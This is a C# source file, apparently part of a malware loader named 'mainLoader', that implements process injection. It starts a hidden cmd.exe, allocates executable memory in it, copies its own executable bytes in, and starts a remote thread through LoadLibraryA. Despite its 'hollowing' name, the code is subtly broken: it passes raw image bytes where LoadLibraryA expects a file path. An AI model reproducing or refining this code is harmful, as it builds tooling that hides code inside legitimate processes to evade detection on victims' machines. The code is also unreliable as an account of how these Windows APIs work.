using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace mainLoader
{
    internal class HollowingProcess
    {
        public static void HollowProcess()
        {
            string targetProcessName = "cmd.exe";
            string currentProcessPath = Process.GetCurrentProcess().MainModule.FileName;
            byte[] currentProcessBytes = File.ReadAllBytes(currentProcessPath);

            ProcessStartInfo startInfo = new ProcessStartInfo(targetProcessName);
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;

            Process targetProcess = Process.Start(startInfo);
            IntPtr targetProcessHandle = OpenProcess(ProcessAccessFlags.All, false, targetProcess.Id);
            IntPtr currentProcessHandle = IntPtr.Zero;

            IntPtr currentProcessBaseAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, (uint)currentProcessBytes.Length, AllocationType.Commit, MemoryProtection.PAGE_EXECUTE_READWRITE);

            IntPtr bytesWritten;
            WriteProcessMemory(targetProcessHandle, currentProcessBaseAddress, currentProcessBytes, (int)currentProcessBytes.Length, out bytesWritten);
            IntPtr kernel32ModuleHandle = GetModuleHandle("kernel32.dll");
            IntPtr loadLibraryAddress = GetProcAddress(kernel32ModuleHandle, "LoadLibraryA");
            IntPtr threadHandle = CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, loadLibraryAddress, currentProcessBaseAddress, 0, out IntPtr threadId);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            uint exitCode;

            GetExitCodeThread(threadHandle, out exitCode);
            CloseHandle(threadHandle);

            Console.WriteLine("Injection successful");

            //Console.ReadKey();
        }

        private static int GetNewProcessId(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            int maxId = 0;
            foreach (Process process in processes)
            {
                if (process.Id > maxId)
                {
                    maxId = process.Id;
                }
            }
            return maxId;
        }

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [Flags]
        enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }

        [Flags]
        enum AllocationType : uint
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
    }
}
